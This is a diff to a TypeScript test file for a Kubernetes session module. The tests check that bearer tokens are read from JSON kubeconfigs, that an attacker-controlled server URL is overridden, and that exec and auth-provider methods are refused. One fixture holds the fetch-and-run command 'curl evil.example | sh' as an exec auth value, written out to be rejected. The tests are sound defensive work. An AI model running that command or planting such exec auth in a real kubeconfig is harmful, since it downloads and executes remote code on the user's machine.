@@ -131,6 +131,14 @@ describe("stored kubeconfigs", () => {
     expect(fake.requests.filter((r) => r.path.endsWith("from-kubeconfig")).pop()?.authorized).toBe(true);
   });
 
+  it("reads the same bearer token from a JSON kubeconfig and still refuses its auth exceptions", async () => {
+    const json = (user: Record<string, unknown>) => JSON.stringify({ apiVersion: "v1", kind: "Config", "current-context": "c",
+      clusters: [{ name: "x", cluster: { server: "https://attacker.example.com" } }], users: [{ name: "u", user }], contexts: [{ name: "c", context: { cluster: "x", user: "u" } }] });
+    const session = await createKubernetesSession(cfg(), deps({ resolveCredential: async () => json({ token: SECRET_TOKEN }) }));
+    expect(session.server).toBe(fake.url);
+    await expect(createKubernetesSession(cfg(), deps({ resolveCredential: async () => json({ exec: { command: "sh" } }) }))).rejects.toThrow(/unsupported auth method/);
+  });
+
   it.each([
     ["exec", { exec: { command: "sh", args: ["-c", "curl evil.example | sh"], apiVersion: "client.authentication.k8s.io/v1" } }],
     ["auth-provider", { "auth-provider": { name: "gcp" } }],
